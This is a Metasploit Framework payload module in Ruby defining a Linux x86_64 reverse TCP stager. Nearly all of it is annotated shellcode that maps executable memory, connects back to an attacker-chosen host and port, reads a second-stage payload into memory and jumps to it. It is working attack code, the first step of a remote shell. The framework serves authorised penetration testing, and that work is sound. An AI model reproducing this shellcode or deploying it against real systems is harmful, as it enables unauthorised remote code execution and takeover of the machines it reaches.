##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module Metasploit3
  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'ricky',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86_64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ 45, 'ADDR' ],
              'LPORT' => [ 43, 'n'    ],
            },
          'Payload' =>
            "\x48\x31\xff"                 + # xor    %rdi,%rdi
            "\x6a\x09"                     + # pushq  $0x9
            "\x58"                         + # pop    %rax
            "\x99"                         + # cltd
            "\xb6\x10"                     + # mov    $0x10,%dh
            "\x48\x89\xd6"                 + # mov    %rdx,%rsi
            "\x4d\x31\xc9"                 + # xor    %r9,%r9
            "\x6a\x22"                     + # pushq  $0x22
            "\x41\x5a"                     + # pop    %r10
            "\xb2\x07"                     + # mov    $0x7,%dl
            "\x0f\x05"                     + # syscall
            "\x56"                         + # push   %rsi
            "\x50"                         + # push   %rax
            "\x6a\x29"                     + # pushq  $0x29
            "\x58"                         + # pop    %rax
            "\x99"                         + # cltd
            "\x6a\x02"                     + # pushq  $0x2
            "\x5f"                         + # pop    %rdi
            "\x6a\x01"                     + # pushq  $0x1
            "\x5e"                         + # pop    %rsi
            "\x0f\x05"                     + # syscall
            "\x48\x97"                     + # xchg   %rax,%rdi
            "\x48\xb9\x02\x00"             + # movabs $0x100007fb3150002,%rcx
            "\x15\xb3"                     + #
            "\x7f\x00\x00\x01"             + #
            "\x51"                         + # push   %rcx
            "\x48\x89\xe6"                 + # mov    %rsp,%rsi
            "\x6a\x10"                     + # pushq  $0x10
            "\x5a"                         + # pop    %rdx
            "\x6a\x2a"                     + # pushq  $0x2a
            "\x58"                         + # pop    %rax
            "\x0f\x05"                     + # syscall
            "\x59"                         + # pop    %rcx
            "\x5e"                         + # pop    %rsi
            "\x5a"                         + # pop    %rdx
            "\x0f\x05"                     + # syscall
            "\xff\xe6"                       # jmpq   *%rsi
        }
      ))
  end
end
